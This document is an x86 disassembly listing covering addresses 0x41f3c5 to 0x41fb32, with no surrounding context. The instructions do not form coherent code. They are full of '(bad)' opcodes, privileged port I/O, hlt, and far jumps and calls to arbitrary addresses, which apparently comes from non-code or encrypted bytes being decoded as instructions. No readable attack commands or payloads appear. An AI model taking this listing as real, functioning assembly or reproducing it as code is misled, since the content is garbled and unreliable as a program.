  41f3c5:	ror    BYTE PTR [edx+0x58],1
  41f3c8:	fsubr  st(0),st
  41f3ca:	jmp    0x5be8:0xcdc4869
  41f3d1:	push   0x81eb5912
  41f3d6:	mul    BYTE PTR ds:0xba3cb7ba
  41f3dc:	inc    esp
  41f3dd:	fbld   TBYTE PTR [esi]
  41f3df:	fninit 
  41f3e1:	sbb    al,0x4c
  41f3e3:	dec    esp
  41f3e4:	or     BYTE PTR [esi-0x43a05ef4],0xfc
  41f3eb:	mov    edi,0x92da4219
  41f3f0:	pop    ss
  41f3f1:	fcom   QWORD PTR [edx]
  41f3f3:	mov    ebp,0xf4f10caf
  41f3f8:	pop    ebx
  41f3f9:	shl    DWORD PTR [ebx+0x22],0xf
  41f3fd:	dec    ebx
  41f3fe:	std    
  41f3ff:	jnp    0x41f38c
  41f401:	cmp    eax,0xc6e166cf
  41f406:	ffreep st(7)
  41f408:	add    esi,edi
  41f40a:	(bad)  [eax+0x29]
  41f40d:	(bad)  
  41f40e:	xchg   esp,eax
  41f40f:	adc    ch,bl
  41f411:	mov    dl,0x15
  41f413:	jg     0x41f3c7
  41f415:	adc    al,dl
  41f417:	xor    ebx,edx
  41f419:	fist   WORD PTR [esi-0x5c50d0c6]
  41f41f:	xor    al,0x5d
  41f421:	nop
  41f422:	add    BYTE PTR [ecx+edi*1],ch
  41f425:	push   ecx
  41f426:	retf   
  41f427:	lahf   
  41f428:	(bad)  
  41f429:	push   edi
  41f42a:	mov    ah,BYTE PTR [edi-0xd3f205d]
  41f430:	jl     0x41f3fc
  41f432:	in     eax,0x73
  41f434:	imul   BYTE PTR [edi-0x5f086b04]
  41f43a:	loope  0x41f42b
  41f43c:	sti    
  41f43d:	push   esi
  41f43e:	sub    al,0xc8
  41f440:	gs in  al,0x1e
  41f443:	adc    BYTE PTR [ebx-0x14e99a0c],0x1c
  41f44a:	jmp    0xcfacaa6
  41f44f:	dec    edi
  41f450:	inc    ebx
  41f451:	or     edi,DWORD PTR [ebp-0x4e8c14d4]
  41f457:	lods   eax,DWORD PTR ds:[esi]
  41f458:	aaa    
  41f459:	nop
  41f45a:	scas   al,BYTE PTR es:[edi]
  41f45b:	xor    ch,bl
  41f45d:	ss (bad) 
  41f45f:	retf   
  41f460:	jb     0x41f465
  41f462:	or     edi,DWORD PTR fs:[ebx+eax*2-0x2c]
  41f467:	jle    0x41f42a
  41f469:	ja     0x41f4a0
  41f46b:	into   
  41f46c:	pop    ss
  41f46d:	cmp    al,0x22
  41f46f:	sub    BYTE PTR [edx-0x62fb8fb0],dh
  41f475:	push   es
  41f476:	xor    ecx,0x8c4e9c6b
  41f47c:	pusha  
  41f47d:	add    ecx,edi
  41f47f:	addr16 jmp 0x41f4d3
  41f482:	mov    DWORD PTR [esi-0x1d],esp
  41f485:	pop    ss
  41f486:	into   
  41f487:	sub    dh,BYTE PTR ds:0xf06f46ea
  41f48d:	fs pusha 
  41f48f:	cmp    BYTE PTR [ebx],bl
  41f491:	jle    0x41f489
  41f493:	sbb    ebp,ebx
  41f495:	fld    TBYTE PTR [edi-0x56]
  41f498:	inc    edi
  41f499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f49a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f49b:	sub    BYTE PTR [ebp-0x43e1bf21],ch
  41f4a1:	loop   0x41f4c2
  41f4a3:	fld    QWORD PTR [di-0x3]
  41f4a7:	rcr    bl,1
  41f4a9:	jmp    0xbf9deff4
  41f4ae:	mov    ebp,0x563b6be4
  41f4b3:	enter  0xa42e,0x18
  41f4b7:	adc    BYTE PTR [edi+0x30c0fe77],bl
  41f4bd:	pop    eax
  41f4be:	sbb    eax,DWORD PTR ds:[eax+0x5ec549]
  41f4c5:	in     eax,dx
  41f4c6:	cmp    esi,eax
  41f4c8:	dec    eax
  41f4c9:	(bad)  
  41f4cb:	mov    esi,0xf85be65
  41f4d0:	jmp    0x41f53d
  41f4d2:	adc    eax,0x9786552d
  41f4d7:	or     eax,0x6ac0dfb8
  41f4dc:	push   ss
  41f4dd:	cmp    esi,DWORD PTR [edi]
  41f4df:	call   0x7737eee4
  41f4e4:	aam    0x99
  41f4e6:	test   al,cl
  41f4e8:	mov    edx,0x99c78426
  41f4ed:	fild   WORD PTR [esi+0x601f340b]
  41f4f3:	pop    ecx
  41f4f4:	cmp    BYTE PTR [ebp-0x4],ch
  41f4f7:	shl    BYTE PTR [ebx-0x444e94d3],1
  41f4fd:	add    DWORD PTR [ebx],esp
  41f4ff:	dec    ebx
  41f500:	out    0xdf,al
  41f502:	inc    edx
  41f503:	(bad)  
  41f504:	or     eax,0x2c3b8b55
  41f509:	jge    0x41f508
  41f50b:	rcl    BYTE PTR [ecx],cl
  41f50d:	xchg   esi,eax
  41f50e:	cwde   
  41f50f:	push   ss
  41f510:	loop   0x41f4d5
  41f512:	lods   al,BYTE PTR ds:[esi]
  41f513:	iret   
  41f514:	int3   
  41f515:	cmp    al,0x80
  41f517:	sti    
  41f518:	jmp    0x41f4a7
  41f51a:	push   ebp
  41f51b:	in     al,0x9e
  41f51d:	dec    ecx
  41f51e:	add    DWORD PTR [esi+0x31],esp
  41f521:	int    0x3b
  41f523:	popf   
  41f524:	(bad)  [edi]
  41f526:	dec    ebp
  41f527:	and    eax,0xc8134898
  41f52c:	(bad)  
  41f52d:	cmc    
  41f52e:	sbb    ebp,ebx
  41f530:	xchg   esi,eax
  41f531:	jo     0x41f57d
  41f533:	jo     0x41f4d2
  41f535:	(bad)  
  41f536:	std    
  41f537:	(bad)  
  41f538:	in     al,dx
  41f539:	test   DWORD PTR [esi],ecx
  41f53b:	adc    ch,BYTE PTR [eax+0x70c8536c]
  41f541:	adc    esi,DWORD PTR [ecx]
  41f543:	icebp  
  41f544:	lock inc edi
  41f546:	jmp    0x330:0x5aa7ff20
  41f54d:	mov    cl,0x16
  41f54f:	dec    esi
  41f550:	rcr    bh,1
  41f552:	loope  0x41f567
  41f554:	rol    DWORD PTR [ebp-0x29],0x97
  41f558:	out    0x79,al
  41f55a:	std    
  41f55b:	mov    al,0x33
  41f55d:	loop   0x41f4ee
  41f55f:	retf   
  41f560:	test   BYTE PTR [eax],cl
  41f562:	stos   BYTE PTR es:[edi],al
  41f563:	retf   
  41f564:	and    dl,BYTE PTR [ecx+0x72]
  41f567:	pop    es
  41f568:	pop    es
  41f569:	sub    cl,BYTE PTR [ebp+0x42cb39b]
  41f56f:	sub    cl,BYTE PTR [esi+0x4773fd49]
  41f575:	mov    al,ds:0xd99559b6
  41f57a:	mov    ecx,0xdceed191
  41f57f:	dec    eax
  41f580:	outs   dx,DWORD PTR ds:[esi]
  41f581:	je     0x41f522
  41f583:	mov    ebp,ebx
  41f585:	pop    esp
  41f586:	mov    al,0xd4
  41f588:	and    BYTE PTR [ebp+0x1b],dl
  41f58b:	std    
  41f58c:	pop    ecx
  41f58d:	fistp  WORD PTR ds:0x49ac7e08
  41f593:	mov    eax,0x29fcabf8
  41f598:	jge    0x41f559
  41f59a:	fiadd  WORD PTR [ecx+edi*1]
  41f59d:	push   ds
  41f59e:	xlat   BYTE PTR ds:[ebx]
  41f59f:	xchg   ebx,eax
  41f5a0:	and    eax,0x1cd1a6cf
  41f5a5:	inc    esi
  41f5a6:	sti    
  41f5a7:	shr    dh,1
  41f5a9:	lds    ebx,FWORD PTR [ebp+eiz*2-0x7f]
  41f5ad:	pop    ebx
  41f5ae:	call   0x56ccf55c
  41f5b3:	pop    eax
  41f5b4:	stos   DWORD PTR es:[edi],eax
  41f5b5:	or     ebx,DWORD PTR [esp+edi*4-0x6]
  41f5b9:	retf   
  41f5ba:	mov    dl,0x14
  41f5bc:	std    
  41f5bd:	fiadd  WORD PTR ds:0xd9c85838
  41f5c3:	jns    0x41f5fa
  41f5c5:	jmp    FWORD PTR [edi+0x20]
  41f5c8:	sbb    eax,0xb2c9fc96
  41f5cd:	dec    esi
  41f5ce:	push   ecx
  41f5cf:	sub    ecx,DWORD PTR [ebp+0x45c7e2e6]
  41f5d5:	into   
  41f5d6:	dec    ebp
  41f5d7:	mov    ds:0x600fda70,eax
  41f5dc:	or     edx,ecx
  41f5de:	cld    
  41f5df:	add    DWORD PTR [esi],ecx
  41f5e1:	add    BYTE PTR [esi],ah
  41f5e3:	in     al,dx
  41f5e4:	xor    DWORD PTR [ecx+0x5700c830],0xffffffa7
  41f5eb:	scas   eax,DWORD PTR es:[edi]
  41f5ec:	and    ebx,ebx
  41f5ee:	clc    
  41f5ef:	leave  
  41f5f0:	jmp    0x41f5cb
  41f5f2:	xor    al,0x3c
  41f5f4:	sub    WORD PTR [esi-0x6e20631f],ax
  41f5fb:	adc    eax,0x449ea0e5
  41f600:	xchg   esp,eax
  41f601:	mov    ah,0xfc
  41f603:	mov    ch,BYTE PTR [edi+0x76]
  41f606:	or     BYTE PTR [ebx],bl
  41f608:	lahf   
  41f609:	test   DWORD PTR [edx],esp
  41f60b:	retf   
  41f60c:	or     BYTE PTR [esi+0x29edc1b4],ch
  41f612:	std    
  41f613:	and    ebp,DWORD PTR [esi-0xb]
  41f616:	mov    edx,ecx
  41f618:	mov    edx,0xa2bcf7fe
  41f61d:	mov    esi,0x25a1c862
  41f622:	stos   DWORD PTR es:[edi],eax
  41f623:	dec    esi
  41f624:	push   ss
  41f625:	push   cs
  41f626:	test   edi,ebx
  41f628:	sbb    eax,0xeb06998c
  41f62d:	cdq    
  41f62e:	(bad)  
  41f630:	mov    ecx,0x9deeddb7
  41f635:	fsubr  QWORD PTR [ebx-0x3a]
  41f638:	dec    ebx
  41f639:	sbb    eax,0x323310d5
  41f63e:	cmp    cl,BYTE PTR [eax-0x16]
  41f641:	xor    eax,DWORD PTR [edx-0x23]
  41f644:	cli    
  41f645:	cwde   
  41f646:	pop    edx
  41f647:	stc    
  41f648:	add    dh,BYTE PTR [eax-0x26cd7c58]
  41f64e:	jp     0x41f62a
  41f650:	inc    edx
  41f651:	pop    ss
  41f652:	mov    ebp,0x242ffb2
  41f657:	mov    edi,0x3de5e3eb
  41f65c:	ins    DWORD PTR es:[edi],dx
  41f65d:	jnp    0x41f612
  41f65f:	out    0xc,al
  41f661:	fisttp WORD PTR [edx-0x49]
  41f664:	pop    edx
  41f665:	addr16 ds mov edx,?
  41f669:	or     ch,bh
  41f66b:	scas   al,BYTE PTR es:[edi]
  41f66c:	mov    edx,0x5090f2bc
  41f671:	leave  
  41f672:	jmp    0x41f642
  41f674:	fwait
  41f675:	jl     0x41f61f
  41f677:	inc    esi
  41f678:	or     eax,0xf2bb7f81
  41f67d:	xlat   BYTE PTR ds:[ebx]
  41f67e:	pushf  
  41f67f:	push   esi
  41f680:	add    al,0x56
  41f682:	add    ch,BYTE PTR [ecx+edx*2-0x45350293]
  41f689:	push   0x2e
  41f68b:	xchg   ebx,eax
  41f68c:	mov    edi,0x5e05cbdf
  41f691:	dec    ecx
  41f692:	fnstsw WORD PTR [esi]
  41f694:	outs   dx,BYTE PTR ds:[esi]
  41f695:	loope  0x41f694
  41f697:	call   0x34c2f12e
  41f69c:	mov    esp,0xb7bac4f1
  41f6a1:	fild   WORD PTR [edi-0x540fc2aa]
  41f6a7:	push   cs
  41f6a8:	enter  0x6c,0xfa
  41f6ac:	jno    0x41f6d0
  41f6ae:	cmp    ebx,DWORD PTR [ebx-0x53a57800]
  41f6b4:	and    bl,bh
  41f6b6:	(bad)  
  41f6b8:	test   al,0xf6
  41f6ba:	jge    0x41f6e7
  41f6bc:	or     bh,0xfc
  41f6bf:	inc    esi
  41f6c0:	adc    dl,dl
  41f6c2:	push   0x77
  41f6c4:	je     0x41f701
  41f6c6:	inc    ebp
  41f6c7:	xchg   ebp,eax
  41f6c8:	mov    bh,0xdf
  41f6ca:	test   edx,edi
  41f6cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6cd:	das    
  41f6ce:	jae    0x41f6ff
  41f6d0:	xor    esi,ecx
  41f6d2:	cld    
  41f6d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6d4:	lock daa 
  41f6d6:	xor    eax,0x64d40b14
  41f6db:	enter  0xa27f,0x7
  41f6df:	(bad)  
  41f6e1:	mov    al,0xfd
  41f6e3:	and    edi,ecx
  41f6e5:	pop    ds
  41f6e6:	inc    edi
  41f6e7:	sub    al,0xeb
  41f6e9:	dec    eax
  41f6ea:	jb     0x41f68a
  41f6ec:	mov    bl,0x42
  41f6ee:	sbb    ecx,eax
  41f6f0:	(bad)  
  41f6f1:	cwde   
  41f6f2:	fsqrt  
  41f6f4:	mov    ?,WORD PTR [edx]
  41f6f6:	mov    ebx,0x653ee9cc
  41f6fb:	pop    esp
  41f6fc:	leave  
  41f6fd:	sbb    BYTE PTR [eax+ecx*1],bl
  41f700:	inc    esi
  41f701:	popf   
  41f702:	nop
  41f703:	add    BYTE PTR [edx-0x19],0xd8
  41f707:	pusha  
  41f708:	sub    ecx,DWORD PTR [eax]
  41f70a:	cld    
  41f70b:	and    esi,ebx
  41f70d:	sbb    ecx,DWORD PTR [ebx+0x18]
  41f710:	sub    eax,0xeb621455
  41f715:	mov    ebx,0xd2ef3c6e
  41f71a:	idiv   DWORD PTR [edi]
  41f71c:	mov    bh,0xdc
  41f71e:	or     eax,0x94799eba
  41f723:	mov    eax,ds:0xb1321f63
  41f728:	out    0x74,al
  41f72a:	ds repz ja 0x41f724
  41f72e:	jg     0x41f76d
  41f730:	adc    eax,DWORD PTR [edi-0x5]
  41f733:	push   ds
  41f734:	mov    esi,0x5b9e61e0
  41f739:	mov    ebp,DWORD PTR [eax+ebx*4-0x1f]
  41f73d:	into   
  41f73e:	sar    eax,0xeb
  41f741:	and    cl,dh
  41f743:	mov    dl,0x62
  41f745:	inc    edi
  41f746:	aaa    
  41f747:	jae    0x41f70b
  41f749:	xchg   edi,eax
  41f74a:	add    ebp,DWORD PTR [edx-0x7516de15]
  41f750:	retf   0x1208
  41f753:	and    al,0xeb
  41f755:	mov    ebp,ebp
  41f757:	pusha  
  41f758:	and    ecx,DWORD PTR [edx-0x78]
  41f75b:	ret    
  41f75c:	out    0xea,al
  41f75e:	std    
  41f75f:	pop    esp
  41f760:	pop    esi
  41f761:	pop    ds
  41f762:	or     eax,DWORD PTR [edx+ebx*8-0x15c4565b]
  41f769:	mov    edx,edx
  41f76b:	sub    dl,BYTE PTR [ecx+0x27405420]
  41f771:	popa   
  41f772:	push   eax
  41f773:	out    dx,al
  41f774:	mov    esi,DWORD PTR [ecx+0x12]
  41f777:	enter  0xaf02,0x33
  41f77b:	xchg   DWORD PTR [ecx+0x58],ebp
  41f77e:	cld    
  41f77f:	mov    DWORD PTR [esi],esi
  41f781:	xchg   esi,eax
  41f782:	or     DWORD PTR [ebp+0xafbf73b],edi
  41f788:	rcr    bh,1
  41f78a:	jecxz  0x41f7c3
  41f78c:	cs xor eax,0x91b1231b
  41f792:	daa    
  41f793:	arpl   bx,bp
  41f795:	inc    edx
  41f796:	not    DWORD PTR [ebp+eax*1-0x76]
  41f79a:	mov    al,0x6d
  41f79c:	out    dx,eax
  41f79d:	jmp    0xabf4777a
  41f7a2:	xchg   esi,eax
  41f7a3:	sbb    eax,0x56c5ae6b
  41f7a8:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7ab:	jo     0x41f74a
  41f7ad:	inc    ebp
  41f7ae:	cld    
  41f7af:	xchg   BYTE PTR [ebx-0x46],al
  41f7b2:	ss pop es
  41f7b4:	sbb    ebx,DWORD PTR [esi+0x41]
  41f7b7:	jge    0x41f781
  41f7b9:	fisttp WORD PTR [edx]
  41f7bb:	(bad)  
  41f7bc:	inc    ecx
  41f7bd:	sbb    bh,BYTE PTR ds:0x1157422
  41f7c3:	int3   
  41f7c4:	arpl   WORD PTR [edx],bp
  41f7c6:	cmp    eax,0x7dd912cf
  41f7cb:	outs   dx,DWORD PTR ds:[esi]
  41f7cc:	jb     0x41f7ad
  41f7ce:	jo     0x41f7dd
  41f7d0:	(bad)  
  41f7d1:	ret    0x34d9
  41f7d4:	and    al,BYTE PTR [edi-0x3]
  41f7d7:	sbb    BYTE PTR [ecx-0x7b],dl
  41f7da:	and    eax,0x3b7b7aaa
  41f7df:	leave  
  41f7e0:	stos   BYTE PTR es:[edi],al
  41f7e1:	xrelease xchg BYTE PTR [eax+0x49b3203],al
  41f7e8:	out    dx,eax
  41f7e9:	xchg   ebp,eax
  41f7ea:	cld    
  41f7eb:	stc    
  41f7ec:	pop    ebx
  41f7ed:	mov    DWORD PTR [esi-0x6a],0xc8673582
  41f7f4:	icebp  
  41f7f5:	mul    BYTE PTR [edi+0x62562fd5]
  41f7fb:	mov    cl,0xeb
  41f7fd:	out    0x34,eax
  41f7ff:	mov    ?,edx
  41f801:	xor    ecx,DWORD PTR [edi-0x11]
  41f804:	push   0xff45dfdf
  41f809:	add    bl,BYTE PTR [ecx]
  41f80b:	fs sti 
  41f80d:	outs   dx,DWORD PTR ds:[esi]
  41f80e:	xor    DWORD PTR [esi-0x570120af],esi
  41f814:	mov    ah,0x19
  41f816:	push   edx
  41f817:	jmp    0x47fa:0x8bafdf7d
  41f81e:	add    al,BYTE PTR [edi+0x2e]
  41f821:	and    ch,bh
  41f823:	sub    bl,dh
  41f825:	push   esi
  41f826:	cmp    eax,0xc02c3284
  41f82b:	push   ds
  41f82c:	imul   ebx,edi,0x6e
  41f82f:	ins    DWORD PTR es:[edi],dx
  41f830:	arpl   WORD PTR [ecx+0x55e0adb5],cx
  41f836:	das    
  41f837:	mov    ch,0x0
  41f839:	sbb    cl,BYTE PTR [ebp-0x6a]
  41f83c:	stos   DWORD PTR es:[edi],eax
  41f83d:	inc    ecx
  41f83e:	sbb    eax,0xf7b6599
  41f843:	mov    eax,ds:0x317fd8b5
  41f848:	mov    WORD PTR [ecx-0x432b744],fs
  41f84e:	(bad)  
  41f84f:	cwde   
  41f850:	jmp    0x41f816
  41f852:	lahf   
  41f853:	fcom   DWORD PTR [esi+0x60]
  41f856:	loop   0x41f7d9
  41f858:	inc    ecx
  41f859:	fisub  WORD PTR [esi]
  41f85b:	push   edx
  41f85c:	mov    ds:0x33fe703d,eax
  41f861:	(bad)  
  41f862:	setne  bl
  41f865:	sbb    ah,BYTE PTR [edi-0x65]
  41f868:	push   0x2d
  41f86a:	repnz add bl,dl
  41f86d:	int3   
  41f86e:	cmp    bh,BYTE PTR [esi-0x78186bbd]
  41f874:	repz xchg esi,eax
  41f876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f877:	outs   dx,DWORD PTR ds:[esi]
  41f878:	mov    al,ds:0x465c0037
  41f87d:	cmp    al,BYTE PTR [edi-0x14a19b4a]
  41f883:	jmp    0xdf88:0x994bb99b
  41f88a:	sbb    esi,DWORD PTR [ebx+0x1689abf4]
  41f890:	push   ebp
  41f891:	cwde   
  41f892:	cld    
  41f893:	repnz dec ebx
  41f895:	daa    
  41f896:	fisub  WORD PTR [edx]
  41f898:	ins    DWORD PTR es:[edi],dx
  41f899:	iret   
  41f89a:	clc    
  41f89b:	(bad)  
  41f89c:	stos   DWORD PTR es:[edi],eax
  41f89d:	xor    ch,BYTE PTR [eax+0x51]
  41f8a0:	xchg   DWORD PTR [edx-0x20],edx
  41f8a3:	dec    esi
  41f8a4:	in     al,dx
  41f8a5:	push   0xffffff94
  41f8a7:	cli    
  41f8a8:	mov    dl,0xc0
  41f8aa:	inc    edi
  41f8ab:	mov    ds:0xc8427d3f,eax
  41f8b0:	sub    eax,DWORD PTR [eax+0x720b1e32]
  41f8b6:	xchg   DWORD PTR [esi-0x60],esi
  41f8b9:	mov    ebp,?
  41f8bb:	std    
  41f8bc:	xchg   ecx,eax
  41f8bd:	mov    dh,0xe4
  41f8bf:	cmp    ebx,edi
  41f8c1:	dec    edi
  41f8c2:	retf   0x88c8
  41f8c5:	stc    
  41f8c6:	retf   
  41f8c7:	xchg   esp,eax
  41f8c8:	test   DWORD PTR [ebp-0x3e147a28],0x760ab01f
  41f8d2:	mov    ecx,0x4207fb79
  41f8d7:	jmp    0x41f944
  41f8d9:	in     eax,0xd6
  41f8db:	cli    
  41f8dc:	push   ebx
  41f8dd:	lods   al,BYTE PTR ds:[esi]
  41f8de:	or     al,BYTE PTR [edi-0x15]
  41f8e1:	add    ebx,DWORD PTR [ebx]
  41f8e3:	and    BYTE PTR [ecx],bl
  41f8e5:	adc    eax,0xf8165cfb
  41f8ea:	int    0x90
  41f8ec:	stos   DWORD PTR es:[edi],eax
  41f8ed:	mov    cl,0x39
  41f8ef:	aad    0xeb
  41f8f1:	fwait
  41f8f2:	out    dx,al
  41f8f3:	das    
  41f8f4:	xchg   esp,eax
  41f8f5:	shr    DWORD PTR [edi],cl
  41f8f7:	push   ebp
  41f8f8:	rol    DWORD PTR ds:0xf16c33b0,cl
  41f8fe:	out    0x7a,al
  41f900:	hlt    
  41f901:	and    dh,0xb
  41f904:	mov    eax,?
  41f906:	sub    al,0x7d
  41f908:	or     eax,0x68a7fd2a
  41f90d:	jmp    0xbe8a:0xbabc0580
  41f914:	cmp    BYTE PTR [esi],dh
  41f916:	ja     0x41f966
  41f918:	lods   eax,DWORD PTR ds:[esi]
  41f919:	add    DWORD PTR ds:0x1404074d,edi
  41f91f:	sbb    eax,0x575667eb
  41f924:	mov    edx,0x9f661c3e
  41f929:	fld    QWORD PTR [ebx+0x773b17b9]
  41f92f:	mov    bh,0x3e
  41f931:	pop    ds
  41f932:	aam    0x93
  41f934:	(bad)  
  41f935:	jmp    0x99cabfab
  41f93a:	mov    esp,0xa4e6cb51
  41f93f:	xor    BYTE PTR [ecx-0x569e0369],0x4f
  41f946:	pop    esi
  41f947:	aad    0x34
  41f949:	xchg   ebx,eax
  41f94a:	sbb    eax,0xcc74d0c8
  41f94f:	sti    
  41f950:	or     eax,DWORD PTR ds:0xe4ecbaa1
  41f956:	retf   0xb3e4
  41f959:	xchg   DWORD PTR [edx],eax
  41f95b:	jnp    0x41f986
  41f95d:	mov    edi,0x377b25aa
  41f962:	jl     0x41f92c
  41f964:	in     eax,0x79
  41f966:	xor    bh,BYTE PTR [ebp+0x4]
  41f969:	xor    esi,ecx
  41f96b:	inc    esi
  41f96c:	jmp    0x41f8ff
  41f96e:	cmp    eax,0x3a47785c
  41f973:	cld    
  41f974:	sbb    eax,0xebc20d04
  41f979:	add    eax,0xa9a9fb53
  41f97e:	(bad)  
  41f97f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f980:	jmp    0x41f983
  41f982:	hlt    
  41f983:	stos   DWORD PTR es:[edi],eax
  41f984:	je     0x41fa03
  41f986:	mov    bh,ah
  41f988:	outs   dx,DWORD PTR ds:[esi]
  41f989:	fbld   TBYTE PTR [ebp-0x796678d0]
  41f98f:	sbb    eax,0x55fd2c65
  41f994:	sti    
  41f995:	(bad)
  41f998:	leave  
  41f999:	cmc    
  41f99a:	and    cl,dh
  41f99c:	xor    DWORD PTR [ebx],esp
  41f99e:	mov    al,ds:0xdbdf7ea0
  41f9a3:	inc    edi
  41f9a4:	(bad)  
  41f9a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9a6:	stc    
  41f9a7:	imul   ebp
  41f9a9:	sbb    bl,BYTE PTR [edi]
  41f9ab:	sub    dl,BYTE PTR [ebx]
  41f9ad:	dec    eax
  41f9ae:	mov    ebp,0xa62ea598
  41f9b3:	call   0x1d91:0x5947dff0
  41f9ba:	dec    ecx
  41f9bb:	stos   DWORD PTR es:[edi],eax
  41f9bc:	fnstcw WORD PTR [ecx]
  41f9be:	(bad)  
  41f9bf:	sti    
  41f9c0:	sbb    ebx,DWORD PTR [ebx]
  41f9c2:	imul   ecx,DWORD PTR [ecx-0x36],0xf93e98ec
  41f9c9:	fistp  QWORD PTR [ecx-0x7f87d875]
  41f9cf:	fcom   DWORD PTR [ecx]
  41f9d1:	lahf   
  41f9d2:	mov    WORD PTR [ebx],fs
  41f9d4:	jmp    0x41f991
  41f9d6:	dec    ecx
  41f9d7:	arpl   WORD PTR [ebp+0x31],cx
  41f9da:	dec    edi
  41f9db:	pop    ds
  41f9dc:	mov    cl,0xdf
  41f9de:	imul   edi,DWORD PTR [edx],0x85361f6f
  41f9e4:	nop
  41f9e5:	push   0xffffff99
  41f9e7:	dec    ebp
  41f9e8:	jmp    0x41f988
  41f9ea:	mov    al,ds:0x3ccc77f
  41f9ef:	push   ebp
  41f9f0:	arpl   si,bx
  41f9f2:	inc    edi
  41f9f3:	stos   DWORD PTR es:[edi],eax
  41f9f4:	loope  0x41fa6a
  41f9f6:	in     eax,0x13
  41f9f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9f9:	push   ebx
  41f9fa:	xchg   ebx,eax
  41f9fb:	(bad)  
  41f9fd:	inc    esp
  41f9fe:	call   0x32d13ee0
  41fa03:	cmp    bh,dh
  41fa05:	fisttp WORD PTR [edi]
  41fa07:	mov    eax,0x8f701b6a
  41fa0c:	loope  0x41f9d2
  41fa0e:	stos   BYTE PTR es:[edi],al
  41fa0f:	pop    es
  41fa10:	and    DWORD PTR [ebx],edx
  41fa12:	std    
  41fa13:	(bad)
  41fa16:	aas    
  41fa17:	mov    bl,0x78
  41fa19:	loopne 0x41fa88
  41fa1b:	enter  0x30ea,0x89
  41fa1f:	loope  0x41fa6f
  41fa21:	push   ss
  41fa22:	arpl   dx,sp
  41fa24:	jmp    0x41fa0c
  41fa26:	jo     0x41fa18
  41fa28:	push   eax
  41fa29:	add    DWORD PTR [eax-0x5d2350ca],ebp
  41fa2f:	cdq    
  41fa30:	cmp    al,0xfb
  41fa32:	mov    DWORD PTR [si],edi
  41fa35:	and    BYTE PTR [esi+0x24],dl
  41fa38:	sbb    BYTE PTR [edx+0x35],bh
  41fa3b:	dec    esi
  41fa3c:	lods   al,BYTE PTR ds:[esi]
  41fa3d:	fbstp  TBYTE PTR [esi+0x25]
  41fa40:	sub    al,0x66
  41fa43:	xlat   BYTE PTR ds:[ebx]
  41fa44:	sub    eax,0x37a146df
  41fa49:	sub    eax,0xa45b18b7
  41fa4e:	cld    
  41fa4f:	adc    al,0x8c
  41fa51:	hlt    
  41fa52:	jno    0x41fa0b
  41fa54:	call   0x9c098f2d
  41fa59:	addr16 pop esp
  41fa5b:	jnp    0x41fa6b
  41fa5d:	jg     0xfee8f7b2
  41fa63:	push   eax
  41fa64:	jg     0x41fa68
  41fa66:	out    dx,al
  41fa67:	adc    esi,eax
  41fa69:	lahf   
  41fa6a:	(bad)  
  41fa6b:	pop    ebp
  41fa6c:	cmp    ch,bl
  41fa6e:	xchg   ebx,eax
  41fa6f:	pop    ds
  41fa70:	mov    bl,BYTE PTR [edi]
  41fa72:	mov    ah,0x99
  41fa74:	hlt    
  41fa75:	mov    cl,0x8d
  41fa77:	sahf   
  41fa78:	jmp    0x41fa95
  41fa7a:	mov    ecx,0x9291799d
  41fa7f:	push   ebp
  41fa80:	mov    edi,ds
  41fa82:	xchg   ah,dh
  41fa84:	ret    0x46dc
  41fa87:	bound  bx,DWORD PTR [eax-0x43cdd104]
  41fa8e:	push   esp
  41fa8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa90:	mov    cl,0x15
  41fa92:	sub    BYTE PTR [eax-0x573deac],0xc3
  41fa99:	push   ecx
  41fa9a:	std    
  41fa9b:	test   BYTE PTR [edx+ebx*2+0x5014578f],dl
  41faa2:	dec    ecx
  41faa3:	nop
  41faa4:	js     0x41fb0e
  41faa6:	std    
  41faa7:	fmul   st,st(3)
  41faa9:	test   DWORD PTR [edx],0xfcb18aea
  41faaf:	dec    edi
  41fab0:	adc    BYTE PTR [ebx-0x59],0xc2
  41fab4:	xlat   BYTE PTR ds:[ebx]
  41fab5:	out    0xaf,al
  41fab7:	enter  0x239a,0x8c
  41fabb:	lahf   
  41fabc:	mov    al,ds:0xf4632d8b
  41fac1:	push   esp
  41fac2:	cmp    ebp,DWORD PTR [ecx+0x65]
  41fac5:	mov    dl,0x7c
  41fac7:	mov    eax,ds:0xe689d7c6
  41facd:	sub    bl,BYTE PTR [ebx+0x2d0c6fa7]
  41fad3:	or     edi,DWORD PTR ds:0x4ecbb9a0
  41fad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fada:	inc    ebx
  41fadb:	jmp    0xf92b:0xb6bd64ed
  41fae2:	bnd jnp 0x41fb64
  41fae5:	and    DWORD PTR [eax],ebx
  41fae7:	dec    eax
  41fae8:	pop    ebx
  41fae9:	xor    DWORD PTR [edi],edx
  41faeb:	shl    BYTE PTR [ebx-0x7967ef21],cl
  41faf1:	sbb    eax,0xcaa2f34f
  41faf6:	add    DWORD PTR [eax+0x573ce250],ecx
  41fafc:	cmp    al,0x78
  41fafe:	in     al,0xd6
  41fb00:	dec    ebp
  41fb01:	(bad)  
  41fb03:	inc    eax
  41fb04:	xor    al,0x6a
  41fb06:	repz cmp ah,al
  41fb09:	in     al,0x3
  41fb0b:	pusha  
  41fb0c:	xchg   esi,eax
  41fb0d:	cmp    BYTE PTR [esi+0x53],0x41
  41fb11:	aaa    
  41fb12:	cmp    BYTE PTR [eax],cl
  41fb14:	fwait
  41fb15:	adc    esp,eax
  41fb17:	enter  0xa555,0x9
  41fb1b:	fwait
  41fb1c:	mov    ds:0xebebdf87,eax
  41fb21:	popa   
  41fb22:	loop   0x41fabb
  41fb24:	pop    ss
  41fb25:	mov    dh,0xfd
  41fb27:	fsub   DWORD PTR [eax]
  41fb29:	int    0x6e
  41fb2b:	iret   
  41fb2c:	xor    DWORD PTR [ebp+0x5f1fa272],esi
  41fb32:	int3   
